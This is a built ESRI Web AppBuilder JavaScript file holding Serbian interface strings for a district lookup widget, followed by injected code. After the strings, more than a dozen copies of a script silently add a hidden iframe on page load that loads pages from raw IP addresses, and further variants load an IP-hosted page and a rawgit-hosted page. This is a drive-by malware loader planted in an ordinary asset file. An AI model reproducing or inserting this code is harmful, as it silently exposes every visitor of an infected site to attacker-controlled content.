// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Milje",kilometers:"Kilometri",feet:"Stope",meters:"Metri"},layerSetting:{layerSettingTabTitle:"Postavke pretrage",buttonSet:"Postavi",selectLayersLabel:"Izaberite sloj",selectLayersHintText:"Napomena: koristi se za izbor sloja poligona i sa njim povezanih slojeva ta\u010daka.",selectPrecinctSymbolLabel:"Izaberite simbol za isticanje poligona",selectGraphicLocationSymbol:"Simbol adresa ili lokacije",graphicLocationSymbolHintText:"Napomena: Simbol za tra\u017eenu adresu ili lokaciju na koju je kliknuto",
precinctSymbolHintText:"Napomena: koristi se za prikaz simbola za izabrani poligon",selectColorForPoint:"Izaberi boju za isticanje ta\u010dke",selectColorForPointHintText:"Napomena: koristi se za prikaz boje za isticanje za izabranu ta\u010dku"},searchSourceSetting:{searchSourceSettingTabTitle:"Pretra\u017ei postavke izvora",searchSourceSettingTitle:"Pretra\u017ei postavke izvora",searchSourceSettingTitleHintText:"Dodajte i konfiguri\u0161ite servise za geokodiranje ili slojeve geoobjekata kao izvora pretrage. Ovi navedeni izvori odre\u0111uju \u0161ta mo\u017ee da se pretra\u017euje unutar trake za pretragu.",
addSearchSourceLabel:"Dodaj izvor pretrage",featureLayerLabel:"Sloj geoobjekata",geocoderLabel:"Geokoder",nameTitle:"Naziv",generalSettingLabel:"Op\u0161te postavke",allPlaceholderLabel:"Tekst \u010duvara mesta za pretragu svega:",allPlaceholderHintText:"Savet: Unesite tekst koji \u0107e se prikazati kao \u010duvar mesta tokom pretrage svih slojeva i geokodera",generalSettingCheckboxLabel:"Prika\u017ei iska\u010du\u0107i prozor za prona\u0111eni geoobjekat ili lokaciju",countryCode:"K\u00f4d(ovi) zemlje ili regiona",
countryCodeEg:"npr. ",countryCodeHint:"Ako ova vrednost ostane prazna, pretra\u017euju se sve zemlje i regioni",questionMark:"?",searchInCurrentMapExtent:"Pretra\u017ei samo u trenutnom obuhvatu mape",zoomScale:"Skala zumiranja",locatorUrl:"URL adresa geokodera",locatorName:"Ime geokodera",locatorExample:"Primer",locatorWarning:"Ova verzija servisa geok\u00f4diranja nije podr\u017eana. Vid\u017eet podr\u017eava samo servis geok\u00f4diranja 10.0 i novije.",locatorTips:"Predlozi nisu dostupni jer servis geok\u00f4diranja ne podr\u017eava predlo\u017eenu mogu\u0107nost.",
layerSource:"Izvor sloja",setLayerSource:"Postavi izvor sloja",setGeocoderURL:"Postavi URL adresu geok\u00f4dera",searchLayerTips:"Predlozi nisu dostupni jer servis geoobjekata ne podr\u017eava mogu\u0107nost paginacije.",placeholder:"Tekst \u010duvara mesta",searchFields:"Polja za pretragu",displayField:"Prika\u017ei polje",exactMatch:"Potpuno podudaranje",maxSuggestions:"Maksimalno predloga",maxResults:"Maksimalno rezultata",enableLocalSearch:"Omogu\u0107i lokalnu pretragu",minScale:"Min. razmera",
minScaleHint:"Kada je razmera mape ve\u0107a od ove razmere, primenjuje se lokalna pretraga",radius:"Polupre\u010dnik",radiusHint:"Defini\u0161e polupre\u010dnik oblasti oko trenutnog centra mape koja se koristi za pobolj\u0161avanje rangiranja kandidata za geokodiranje kako bi se prvo vra\u0107ali kandidati najbli\u017ei lokaciji",meters:"Metri",setSearchFields:"Postavi polja pretrage",set:"Postavi",fieldName:"Naziv",invalidUrlTip:"URL adresa ${URL} nije validna ili nije dostupna.",invalidSearchSources:"Neva\u017ee\u0107e postavke za pretragu izvora"},
layerSelector:{selectPolygonLayerLabel:"Izaberite sloj poligona",selectPolygonLayerHintText:"Napomena: koristi se za izbor sloja poligona.",selectRelatedPointLayerLabel:"Izaberite sloj ta\u010dke povezan sa slojem poligona",selectRelatedPointLayerHintText:"Napomena: koristi se za izbor sloja ta\u010dke povezanog sa slojem poligona",polygonLayerNotHavingRelatedLayer:"Izaberite sloj poligona koji ima povezani sloj ta\u010dke.",errorInSelectingPolygonLayer:"Izaberite sloj poligona koji ima povezani sloj ta\u010dke.",
errorInSelectingRelatedLayer:"Izaberite sloj ta\u010dke povezan sa slojem poligona."},routeSetting:{routeSettingTabTitle:"Postavke smernica",routeServiceUrl:"Servis rutiranja",buttonSet:"Postavi",routeServiceUrlHintText:"Napomena: kliknite na \u201ePostavi\u201c da biste potra\u017eili i izabrali mre\u017enu analizu servisa za rutiranje",directionLengthUnit:"Jedinice du\u017eine pravca",unitsForRouteHintText:"Napomena: koristi se za prikazivanje prijavljenih jedinica za rutiranje",selectRouteSymbol:"Izaberite simbol za prikaz rute",
routeSymbolHintText:"Napomena: koristi se za prikaz simbola linije usmeravanja",routingDisabledMsg:"Da biste omogu\u0107ili uputstva za navigaciju postarajte se da je rutiranje omogu\u0107eno u stavci ArcGIS Online."},networkServiceChooser:{arcgislabel:"Dodaj iz ArcGIS Online",serviceURLabel:"Dodaj URL adresu servisa",routeURL:"URL adresa usmeravanja",validateRouteURL:"Proveri valjanost",exampleText:"Primer",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",
invalidRouteServiceURL:"Navedite va\u017ee\u0107i servis za rutiranje.",rateLimitExceeded:"Prekora\u010deno je ograni\u010denje stope. Poku\u0161ajte ponovo kasnije.",errorInvokingService:"Korisni\u010dko ime ili lozinka su neva\u017ee\u0107i."},symbolPickerPreviewText:"Pregledaj:",showToolToSelectLabel:"Dugme za pode\u0161avanje lokacije",showToolToSelectHintText:"Savet: Pru\u017ea dugme za postavljanje lokacije na mapi umesto postavljanja lokacije klikom na mapu",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});